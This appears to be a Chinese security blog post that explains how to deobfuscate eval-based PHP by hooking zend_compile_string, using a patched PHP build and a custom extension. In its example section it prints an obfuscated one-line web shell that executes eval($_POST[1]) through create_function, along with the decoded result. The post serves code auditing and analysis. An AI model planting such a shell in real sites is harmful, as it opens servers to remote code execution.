<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"/><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/><meta content="yes" name="apple-mobile-web-app-capable"/><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/><meta content="telephone=no" name="format-detection"/><meta name="description" content="Vulnerability|Security|Binary"/><title>解密混淆的PHP程序 | WeaponX's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"/><link rel="stylesheet" type="text/css" href="/css/highlight.css"/><link rel="stylesheet" type="text/css" href="/css/font.css"/><link rel="stylesheet" type="text/css" href="/css/noise.css"/><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"/><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"/><link rel="alternate" type="application/atom+xml" href="/atom.xml"/></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-link" href="/tags/二进制/">二进制</a></div><div class="post-time">2018-04-27</div></div></div><div class="container post-header"><h1>解密混淆的PHP程序</h1></div><div class="container post-content"><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>团队大佬在做PHP代码审计的时候发现PHP代码是被混淆过的。虽然可以通过自己手动解密可以还原原先的PHP代码，但是混淆过程比较复杂且自己写脚本还原非常麻烦。所以，我这边通过PHP底层的操作对混淆后的PHP代码进行还原。</p>
<a id="more"></a>
<h2 id="0x02-PHP代码混淆"><a href="#0x02-PHP代码混淆" class="headerlink" title="0x02 PHP代码混淆"></a>0x02 PHP代码混淆</h2><p>PHP代码混淆一般来说有两种方法：</p>
<ul>
<li>需要PHP扩展</li>
<li>无需PHP扩展</li>
</ul>
<p>本文我们主要讲解无需PHP扩展的代码混淆的解密。大多数的无需扩展的php代码混淆原理上都是使用eval进行代码的执行。如果我们能够得到<code>eval</code>函数的参数，即可获得解密后的代码。</p>
<p>不过，一般来说PHP的混淆都会通过多次<code>eval</code>来还原并执行php代码，所以我们可以通过hook PHP的eval函数来打印其参数来解密代码。</p>
<h2 id="0x03-hook-eval"><a href="#0x03-hook-eval" class="headerlink" title="0x03 hook eval"></a>0x03 hook eval</h2><p>PHP中的eval函数在Zend里需要调用<code>zend_compile_string</code>函数，我们可以通过调试看看<code>zend_compile_string</code>函数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">user@ubuntu ~/php-5.6.35/Zend ~ grep -rn <span class="string">"zend_compile_string"</span> *</div><div class="line">zend.c:693: zend_compile_string = compile_string;</div></pre></td></tr></table></figure>
<p>我们发现<code>zend_compile_string</code>函数其实就是<code>compile_string</code>函数。所以我们可以通过写一个简单的PHP代码，看能否在<code>compile_string</code>中获取到<code>eval</code>参数的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">eval</span>(<span class="string">"phpinfo();"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>首先我们编译一下下载好的PHP。注意，由于我们后面要进行调试，所以要在编译时加上<code>-g</code>参数，加调试符号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">./configure CFLAGS=<span class="string">"-g"</span> CXXFLAGS=<span class="string">"-g"</span></div><div class="line">make -j16</div></pre></td></tr></table></figure>
<p>接着我们使用gdb调试php程序。首先设置程序的参数，且在<code>compile_string</code>函数下好断点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ <span class="built_in">set</span> args xxx.php</div><div class="line">gdb-peda$ b compile_string</div><div class="line">Breakpoint 1 at 0x6b4480: file Zend/zend_language_scanner.l, line 716.</div></pre></td></tr></table></figure>
<p>然后让php程序跑起来</p>
<p><img src="1.png" alt=""></p>
<p>发现程序断下来后，我们发现<code>compile_string</code>的第一个参数<code>source_string</code>为php代码中<code>eval</code>函数的参数在Zend中的结构——即<code>zval_struct</code>。<code>source_string.value.str.val</code>即为参数的字符串形式。</p>
<ul>
<li>通过修改<code>compile_string</code>函数来打印<code>eval</code>的参数，代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (Z_TYPE_P(source_string) == IS_STRING)                          <span class="comment">// 判断是否为string类型</span></div><div class="line">&#123;</div><div class="line">    len = Z_STRLEN_P(source_string);                               <span class="comment">// 求string的长度</span></div><div class="line">    str = estrndup(Z_STRVAL_P(source_string), len);                <span class="comment">// 拷贝到str中</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==================DUMP_CODE====================\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str);                                           <span class="comment">//打印</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==================DUMP_CODE====================\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>修改好之后重新编译php，运行被加密的php代码</p>
<p><img src="2.png" alt=""></p>
<p>解密后的PHP代码如下</p>
<p><img src="3.png" alt=""></p>
<p>可以看到已经完全还原了被混淆的PHP代码</p>
<ul>
<li>通过编写php扩展来解密php脚本</li>
</ul>
<p>编写php扩展的原理就是用我们的函数hook <code>zend_compile_string</code>函数，将函数的参数打印出来后再交还给<code>zend_compile_string</code>函数执行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">./ext/ext_skel --extname=decrypt_code</div></pre></td></tr></table></figure>
<p>首先，我们写一个自己的hook函数。此函数的功能就是判断<code>eval</code>函数的参数是否为字符串，如果不是，则按原路径执行；如果是，则将参数打印出来后按照原路径执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> zend_op_array *<span class="title">decrypt_code_compile_string</span><span class="params">(zval *source_string, <span class="keyword">char</span> *filename TSRMLS_DC)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len;</div><div class="line">    <span class="keyword">char</span> *str;</div><div class="line">    <span class="keyword">if</span> (Z_TYPE_P(source_string) != IS_STRING)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> orig_zend_compile_string(source_string, filename TSRMLS_CC);</div><div class="line">    &#125;</div><div class="line">    len  = Z_STRLEN_P(source_string);</div><div class="line">    str = estrndup(Z_STRVAL_P(source_string), len);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==========DUMP===========\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, str);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==========DUMP===========\n"</span>);</div><div class="line">    <span class="keyword">return</span> orig_zend_compile_string(source_string, filename TSRMLS_CC);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接着，我们修改PHP扩展加载函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">PHP_MINIT_FUNCTION(decrypt_code)</div><div class="line">&#123;</div><div class="line">    <span class="comment">/* If you have INI entries, uncomment these lines </span></div><div class="line">    REGISTER_INI_ENTRIES();</div><div class="line">    */</div><div class="line">    orig_compile_string = zend_compile_string;</div><div class="line">    zend_compile_string = decrypt_code_compile_string;</div><div class="line">    <span class="keyword">return</span> SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此函数的功能就是保存<code>zend_compile_string</code>函数的地址，接着用我们的hook函数替换<code>zend_compile_string</code>的地址。当<code>eval</code>函数调用<code>zend_compile_string</code>时，就调用了我们的hook函数。</p>
<p>最后，我们修改PHP扩展的卸载函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">PHP_MSHUTDOWN_FUNCTION(decrypt_code)</div><div class="line">&#123;</div><div class="line">    <span class="comment">/* uncomment this line if you have INI entries</span></div><div class="line">    UNREGISTER_INI_ENTRIES();</div><div class="line">    */</div><div class="line">    zend_compile_string = orig_zend_compile_string;</div><div class="line">    <span class="keyword">return</span> SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当这个扩展被卸载的时候将函数的hook解除。</p>
<p>最后，编译我们的扩展</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">phpize</div><div class="line">./configure --with-php-config=/usr/<span class="built_in">local</span>/php/bin/php-config</div><div class="line">make</div></pre></td></tr></table></figure>
<p>接着，在php.ini中加上我们的扩展。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">extension=decrypt_code.so</div></pre></td></tr></table></figure>
<p>运行此脚本也可得到同样的输出。</p>
<h2 id="0x04-利用其他函数还原的解密"><a href="#0x04-利用其他函数还原的解密" class="headerlink" title="0x04 利用其他函数还原的解密"></a>0x04 利用其他函数还原的解密</h2><p>其实，混淆代码的解密就是类似于代码执行。最终还是要执行PHP代码，而执行PHP代码的方法很多，除了<code>eval</code>函数还有<code>assert</code>、<code>call_user_func</code>、<code>call_user_func_array</code>、<code>create_function</code>等。这些函数的底层也是调用了<code>zend_compile_string</code>，所以也可以利用hook <code>eval</code>来还原混淆后的加密代码。</p>
<h2 id="0x05-Example"><a href="#0x05-Example" class="headerlink" title="0x05 Example"></a>0x05 Example</h2><p>一段示例代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>运行一下，得到解密后的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">./php 3.php </div><div class="line"></div><div class="line">=====================DUMP_CODE========================</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">__lambda_func</span></span>()&#123;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);&#125;</div><div class="line"></div><div class="line">=====================DUMP_CODE========================</div></pre></td></tr></table></figure>
<h2 id="0x06-Refer"><a href="#0x06-Refer" class="headerlink" title="0x06 Refer"></a>0x06 Refer</h2><p><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="external">http://blog.evalbug.com/2017/09/21/phpdecode_01/</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/19" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/19</a></p>
<p><a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="external">http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html</a></p>
<p><a href="https://lightless.me/archives/Zend-Extension-PHP-WAF.html" target="_blank" rel="external">https://lightless.me/archives/Zend-Extension-PHP-WAF.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a></p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"/><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body></html>